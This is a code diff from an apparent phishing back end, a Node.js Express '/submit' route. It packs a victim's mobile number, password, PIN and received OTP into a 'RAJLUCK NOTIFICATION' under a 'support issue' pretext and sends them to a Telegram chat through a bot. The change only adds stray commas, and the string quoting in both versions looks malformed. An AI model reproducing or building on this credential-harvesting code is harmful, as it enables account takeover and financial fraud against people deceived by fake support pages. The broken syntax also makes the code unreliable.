@@ -31,13 +31,13 @@ app.post("/submit", async (req, res) => {
 
         // Telegram par bheje jaane wale message ka format
         const messageText = `
-🔴 RAJLUCK NOTIFICATION\n\n
-📌 Support Issue: ` + issue + `\n` +
- 📱 Mobile Number: ` + phone + `\n` +
- 🔒 Password: ` + password + `\n` +
- 🆔 Pin: ` + pin + `\n` +
- 💬 Received OTP: ` + otp + `\n\n` +
- Demo support information received.`;
+,🔴 RAJLUCK NOTIFICATION\n\n
+,📌 Support Issue: ` + issue + `\n` +
+ ,📱 Mobile Number: ` + phone + `\n` +
+,🔒 Password: ` + password + `\n` +
+ ,🆔 Pin: ` + pin + `\n` +
+ ,💬 Received OTP: ` + otp + `\n\n` +
+ ,Demo support information received.`;
 
         // Telegram bot ke zariye chat mein message send karna
         await bot.sendMessage(process.env.CHAT_ID, messageText);
